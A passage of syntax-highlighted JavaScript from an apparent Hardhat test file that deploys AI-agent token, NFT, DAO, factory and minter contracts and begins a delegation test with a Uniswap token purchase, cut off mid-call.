${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Delegate a non-validator\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Need to provide LP first\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken } = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u0026quot;AgentToken\u0026quot;, agent.token);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Buy tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const amountToBuy = parseEther(\u0026quot;10000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const capital = parseEther(\u0026quot;200000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(trader.address, capital);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(process.env.UNISWAP_ROUTER, capital);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(trader)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .swapTokensForExactTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        